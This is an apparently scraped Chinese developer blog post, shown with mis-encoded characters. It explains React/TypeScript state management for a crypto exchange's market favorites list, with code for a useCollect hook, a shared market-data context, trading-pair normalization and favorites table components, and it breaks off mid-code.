itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2107109724924174/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Naomi_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:52:25.000Z" title="Fri Jan 30 2026 11:52:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€æ¶æ„è®¾è®¡ä¸æŠ€æœ¯é€‰å‹</h3>
<h4 data-id="heading-1">1.1 Markets æ¨¡å—æ ¸å¿ƒæ¶æ„</h4>
<h5 data-id="heading-2">è‡ªå®šä¹‰ Hook: useCollectï¼ˆæ ¸å¿ƒçŠ¶æ€ç®¡ç†ï¼‰</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// apps/my-page/hooks/use-collect.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useCollect</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [collectInfo, setCollectInfo] = useState&lt;<span class="hljs-title class_">CollectInfo</span>&gt;();
  <span class="hljs-keyword">const</span> [spotCollectState, setSpotCollectState] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [contractCollectState, setContractCollectState] = useState&lt;<span class="hljs-built_in">string</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [pendingUnfavorites, setPendingUnfavorites] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

  <span class="hljs-comment">// åˆå§‹åŒ–æ”¶è—æ•°æ®</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">initCollectInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCollectInfo</span>();
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">ret_code</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-title function_">setCollectInfo</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>);
      <span class="hljs-title function_">setSpotCollectState</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>.<span class="hljs-property">spotBookSymbolSequence</span>?.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>) || []);
      <span class="hljs-title function_">setContractCollectState</span>(res.<span class="hljs-property">result</span>.<span class="hljs-property">preferences</span>.<span class="hljs-property">bookSymbolSequence</span>?.<span class="hljs-title function_">split</span>(<span class="hljs-string">','</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>) || []);
    }
  };

  <span class="hljs-comment">// åˆ·æ–°æ”¶è—æ•°æ®ï¼ˆåˆ‡æ¢ Tab æ—¶è°ƒç”¨ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">refreshCollectInfo</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">initCollectInfo</span>();
    <span class="hljs-title function_">setPendingUnfavorites</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());  <span class="hljs-comment">// æ¸…ç©ºå¾…ç§»é™¤åˆ—è¡¨</span>
  };

  <span class="hljs-comment">// ç‚¹å‡»æ”¶è—/å–æ¶ˆæ”¶è—</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">clickCollect</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">data: MarketData, marketType: <span class="hljs-string">'spot'</span> | <span class="hljs-string">'contract'</span></span>) =&gt; {
    <span class="hljs-keyword">if</span> (!data?.<span class="hljs-property">tradingPair</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> normalizedPair = <span class="hljs-title function_">normalizeTradingPair</span>(data.<span class="hljs-property">tradingPair</span>);  <span class="hljs-comment">// ç§»é™¤æ–œæ </span>
    <span class="hljs-keyword">const</span> currentList = marketType === <span class="hljs-string">'spot'</span> ? spotCollectState : contractCollectState;
    <span class="hljs-keyword">const</span> isCurrentlyCollected = currentList.<span class="hljs-title function_">includes</span>(normalizedPair);

    <span class="hljs-comment">// è®¡ç®—æ–°çš„æ”¶è—åˆ—è¡¨</span>
    <span class="hljs-keyword">const</span> newList = isCurrentlyCollected
      ? currentList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item !== normalizedPair)
      : [...currentList, normalizedPair];

    <span class="hljs-comment">// ä¹è§‚æ›´æ–°æœ¬åœ°çŠ¶æ€ï¼ˆç«‹å³åé¦ˆç”¨æˆ·ï¼‰</span>
    <span class="hljs-keyword">if</span> (marketType === <span class="hljs-string">'spot'</span>) {
      <span class="hljs-title function_">setSpotCollectState</span>(newList);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">setContractCollectState</span>(newList);
    }

    <span class="hljs-comment">// å¼‚æ­¥åŒæ­¥åˆ°æœåŠ¡ç«¯</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateCollectInfo</span>({
      <span class="hljs-attr">upsert_keys</span>: {
        <span class="hljs-attr">spotBookSymbolSequence</span>: marketType === <span class="hljs-string">'spot'</span> ? newList.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>) : spotCollectState.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>),
        <span class="hljs-attr">bookSymbolSequence</span>: marketType === <span class="hljs-string">'contract'</span> ? newList.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>) : contractCollectState.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>)
      }
    });

    <span class="hljs-comment">// åŸ‹ç‚¹è®°å½•</span>
    track?.(<span class="hljs-string">'MyPageClick'</span>, {
      <span class="hljs-attr">section_type</span>: <span class="hljs-string">'Markets'</span>,
      <span class="hljs-attr">button_name</span>: isCurrentlyCollected ? <span class="hljs-string">'Remove_from_Favorites'</span> : <span class="hljs-string">'Add_to_Favorites'</span>,
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites_candidate'</span>,
      <span class="hljs-attr">page_name</span>: marketType
    });
  };

  <span class="hljs-keyword">return</span> {
    collectInfo,
    spotCollectState,
    contractCollectState,
    pendingUnfavorites,
    initCollectInfo,
    refreshCollectInfo,
    clickCollect,
    setPendingUnfavorites
  };
};
</code></pre>
<ul>
<li>åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨APIå¾—åˆ°collectInfo,è®¾ç½®CollectStateçš„åˆå§‹çŠ¶æ€</li>
<li>ç”¨æˆ·æ·»åŠ æ”¶è—çš„æ—¶å€™,è°ƒç”¨æ¥å£,å†æ›´æ–°æœ¬åœ°çŠ¶æ€å’ŒcollectInfo</li>
<li>æ˜¾ç¤ºUIçš„æ—¶å€™,ä¼˜å…ˆæ˜¾ç¤ºæœ¬åœ°çŠ¶æ€,å¤‡ç”¨collectInfo</li>
<li><strong>å»¶è¿ŸåŒæ­¥æœºåˆ¶</strong>ï¼šé€šè¿‡ pendingUnfavorites å®ç°"ä¸ç«‹å³æ¶ˆå¤±"éœ€æ±‚</li>
<li><strong>çŠ¶æ€åˆ†ç¦»</strong>ï¼šSpot å’Œ Contract ç‹¬ç«‹ç®¡ç†ï¼Œé¿å…æ•°æ®æ··æ·†</li>
</ul>
<h4 data-id="heading-3">1.2 å¸‚åœºæ•°æ®å…±äº«ï¼ˆPC ç«¯ä½¿ç”¨ Contextï¼‰</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// apps/my-page/contexts/MarketDataContext.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MarketDataProvider</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">children</span>: <span class="hljs-title class_">ReactNode</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ children }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> marketData = <span class="hljs-title function_">useMarket</span>({
    <span class="hljs-attr">needSpot</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">needContract</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">defaultType</span>: <span class="hljs-string">'spot'</span>,
    <span class="hljs-attr">sortRule</span>: [
      { <span class="hljs-attr">label</span>: <span class="hljs-string">'hot'</span>, <span class="hljs-attr">tab</span>: <span class="hljs-string">'hot'</span> },
      { <span class="hljs-attr">label</span>: <span class="hljs-string">'newListing'</span>, <span class="hljs-attr">tab</span>: <span class="hljs-string">'newListing'</span> },
      <span class="hljs-comment">// ... å…¶ä»–æ’è¡Œæ¦œ</span>
    ]
  });

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MarketDataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{marketData}</span>&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">MarketDataContext.Provider</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// å­ç»„ä»¶ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> { spot, contract, tabKey } = <span class="hljs-title function_">useMarketData</span>();
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ä¸åœ¨é¡¶å±‚ä½¿ç”¨useMarket hookæ˜¯å› ä¸ºé¡¶å±‚çš„çˆ¶ç»„ä»¶ä¼šæ ¹æ®å¸‚åœºç§ç±»(spotæˆ–è¡ç”Ÿå“)å’Œtabçš„stateçš„å˜åŒ–è€Œé‡æ–°æ¸²æŸ“,å¦‚æœç»§ç»­ä½¿ç”¨hookä¼šå¯¼è‡´é‡å¤å‘é€è¯·æ±‚.ä½¿ç”¨contextå°±åªæ˜¯åœ¨Provideré‡Œè¯·æ±‚ä¸€æ¬¡</li>
<li>è§£å†³ Tab åˆ‡æ¢æ—¶ Spot/Contract æ•°æ®é”™ä¹±é—®é¢˜:</li>
</ul>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>åœ¨ Hot tab å¯ä»¥æ­£ç¡®æ˜¾ç¤º Spot æ•°æ®</li>
<li>åˆ‡æ¢åˆ° Favorites tab åï¼Œæ˜¾ç¤ºçš„æ˜¯ Contract æ•°æ®</li>
<li>å†åˆ‡å› Hot tabï¼Œæ•°æ®åˆå˜äº†</li>
</ul>
<p><strong>æ ¹å› åˆ†æï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ é”™è¯¯å®ç°ï¼šæ¯ä¸ª Tab ç‹¬ç«‹è°ƒç”¨ useMarket</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">HotTab</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { spot } = <span class="hljs-title function_">useMarket</span>();  <span class="hljs-comment">// ç‹¬ç«‹å®ä¾‹</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{spot.ranking.hot}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">FavoritesTab</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { contract } = <span class="hljs-title function_">useMarket</span>();  <span class="hljs-comment">// å¦ä¸€ä¸ªç‹¬ç«‹å®ä¾‹</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{contract.spotSymbolList}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
};
</code></pre>
<p>è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸Šè¿°çš„useContextæ•°æ®å…±äº«</p>
<h4 data-id="heading-4">1.3 äº¤æ˜“å¯¹æ ¼å¼æ ‡å‡†åŒ–</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç§»é™¤æ–œæ ç»Ÿä¸€æ ¼å¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">normalizeTradingPair</span> = (<span class="hljs-params">pair: <span class="hljs-built_in">string</span></span>) =&gt; pair?.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">''</span>) || <span class="hljs-string">''</span>;

<span class="hljs-comment">// ç¤ºä¾‹</span>
<span class="hljs-string">'BTC/USDT'</span> =&gt; <span class="hljs-string">'BTCUSDT'</span>  <span class="hljs-comment">// å­˜å‚¨æ ¼å¼</span>
<span class="hljs-string">'BTCUSDT'</span> =&gt; <span class="hljs-string">'BTCUSDT'</span>   <span class="hljs-comment">// å·²æ ‡å‡†åŒ–æ ¼å¼</span>
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>ç°è´§å¸‚åœºè¿”å› BTC/USDTï¼Œåˆçº¦å¸‚åœºè¿”å› BTCUSDT</li>
<li>éœ€è¦ç»Ÿä¸€æ ¼å¼æ‰èƒ½æ­£ç¡®æ¯”è¾ƒå’Œå­˜å‚¨</li>
</ul>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒåŠŸèƒ½å®ç°</h3>
<h4 data-id="heading-6">2.1 Favorites ç©ºçŠ¶æ€é»˜è®¤æ¨èhotæ¦œå•å‰ 6 æ¡æ•°æ®</h4>
<p><strong>ç»„ä»¶ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// apps/my-page/containers/newMyPage/Markets/NoFavorites/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">NoFavorites</span> = (<span class="hljs-params">{ marketType, onAddToFavorites }</span>) =&gt; {
  <span class="hljs-keyword">const</span> { spot, contract } = <span class="hljs-title function_">useMarketData</span>();
  <span class="hljs-keyword">const</span> [selectedItems, setSelectedItems] = useState&lt;<span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

  <span class="hljs-comment">// è·å– Hot æ¦œå•å‰ 6 æ¡æ•°æ®</span>
  <span class="hljs-keyword">const</span> hotData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> data = marketType === <span class="hljs-string">'spot'</span> ? spot : contract;
    <span class="hljs-keyword">return</span> data?.<span class="hljs-property">ranking</span>?.<span class="hljs-property">hot</span>?.<span class="hljs-property">data</span>?.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) || [];
  }, [spot, contract, marketType]);

  <span class="hljs-comment">// é»˜è®¤å…¨é€‰</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> allIds = hotData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">symbolName</span>));
    <span class="hljs-title function_">setSelectedItems</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(allIds));
  }, [hotData]);

  <span class="hljs-comment">// æ·»åŠ åˆ°æ”¶è—</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAddToFavorites</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> selectedArray = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(selectedItems);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">onAddToFavorites</span>(selectedArray);

    <span class="hljs-comment">// åŸ‹ç‚¹</span>
    track?.(<span class="hljs-string">'MyPageClick'</span>, {
      <span class="hljs-attr">page_type</span>: <span class="hljs-string">'favorites_candidate'</span>,
      <span class="hljs-attr">page_name</span>: marketType,
      <span class="hljs-attr">button_name</span>: <span class="hljs-string">'Add_to_Favorites'</span>
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.noFavorites}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.grid}</span>&gt;</span>
        {hotData.map(item =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">NoFavoritesItem</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{item.symbol}</span>
            <span class="hljs-attr">data</span>=<span class="hljs-string">{item}</span>
            <span class="hljs-attr">selected</span>=<span class="hljs-string">{selectedItems.has(normalizeTradingPair(item.symbolName))}</span>
            <span class="hljs-attr">onToggle</span>=<span class="hljs-string">{(id)</span> =&gt;</span> {
              const newSet = new Set(selectedItems);
              newSet.has(id) ? newSet.delete(id) : newSet.add(id);
              setSelectedItems(newSet);
            }}
          /&gt;
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAddToFavorites}</span>&gt;</span>
        Add to Favorites ({selectedItems.size})
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>Grid å¸ƒå±€æ ·å¼ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// NoFavorites/index.module.less</span>
<span class="hljs-selector-class">.grid</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr);
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">24px</span>;

  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;  <span class="hljs-comment">// H5 å•åˆ—</span>
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">12px</span>;
  }
}
</code></pre>
<h4 data-id="heading-7">2.2 æ˜Ÿæ ‡äº¤äº’å®ç°</h4>
<p><strong>MarketDataTable ç»„ä»¶ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /Markets/MarketDataTable/index.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">MarketDataTable</span> = (<span class="hljs-params">{ marketType, tabValue }</span>) =&gt; {
  <span class="hljs-keyword">const</span> { spot, contract } = <span class="hljs-title function_">useMarketData</span>();
  <span class="hljs-keyword">const</span> { spotCollectState, contractCollectState, clickCollect } = <span class="hljs-title function_">useCollect</span>();

  <span class="hljs-comment">// è·å–å½“å‰å¸‚åœºçš„æ”¶è—åˆ—è¡¨</span>
  <span class="hljs-keyword">const</span> collectState = marketType === <span class="hljs-string">'spot'</span> ? spotCollectState : contractCollectState;

  <span class="hljs-comment">// è¿‡æ»¤æ•°æ®ï¼šfavorites tab åªæ˜¾ç¤ºæ”¶è—é¡¹</span>
  <span class="hljs-keyword">const</span> filteredList = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> data = marketType === <span class="hljs-string">'spot'</span> ? spot : contract;
    <span class="hljs-keyword">const</span> rawData = tabValue === <span class="hljs-string">'favorites'</span>
      ? (marketType === <span class="hljs-string">'spot'</span> ? data?.<span class="hljs-property">spotSymbolList</span> : data?.<span class="hljs-property">contractSymbolList</span>)
      : data?.<span class="hljs-property">ranking</span>?.[tabValue]?.<span class="hljs-property">data</span>;

    <span class="hljs-keyword">return</span> rawData?.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({
      <span class="hljs-attr">id</span>: item.<span class="hljs-property">symbol</span>,
      <span class="hljs-attr">tradingPair</span>: item.<span class="hljs-property">symbolName</span>,
      <span class="hljs-attr">price</span>: item.<span class="hljs-property">price</span>,
      <span class="hljs-attr">change24h</span>: <span class="hljs-title class_">Number</span>(item.<span class="hljs-property">change</span>),
      <span class="hljs-attr">volume24h</span>: item.<span class="hljs-property">turnover24hUSD</span>,
      <span class="hljs-attr">icon</span>: marketType === <span class="hljs-string">'spot'</span> ? item.<span class="hljs-property">icon</span> : item?.<span class="hljs-property">lightIcon</span>,
      <span class="hljs-attr">link</span>: item.<span class="hljs-property">link</span>,
      <span class="hljs-attr">isCollected</span>: collectState.<span class="hljs-title function_">includes</span>(<span class="hljs-title function_">normalizeTradingPair</span>(item.<span class="hljs-property">symbolName</span>))  <span class="hljs-comment">// æ”¶è—çŠ¶æ€</span>
    }));
  }, [spot, contract, tabValue, marketType, collectState]);

  <span class="hljs-comment">// åˆ†é¡µå¤„ç†</span>
  <span class="hljs-keyword">const</span> paginatedData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> filteredList?.<span class="hljs-title function_">slice</span>((currentPage - <span class="hljs-number">1</span>) * <span class="hljs-number">6</span>, currentPage * <span class="hljs-number">6</span>) || [];
  }, [filteredList, currentPage]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.tableWrapper}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Trading Pair<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Price<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>24h Change<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>24h Volume<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
          {paginatedData.map(row =&gt; (
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{row.id}</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.pairCell}</span>&gt;</span>
                  {/* æ˜Ÿæ ‡å›¾æ ‡ */}
                  <span class="hljs-tag">&lt;<span class="hljs-name">Tooltip</span> <span class="hljs-attr">title</span>=<span class="hljs-string">{row.isCollected</span> ? '<span class="hljs-attr">Remove</span> <span class="hljs-attr">from</span> <span class="hljs-attr">Favorites</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">Add</span> <span class="hljs-attr">to</span> <span class="hljs-attr">Favorites</span>'}&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                      <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.starIcon}</span>
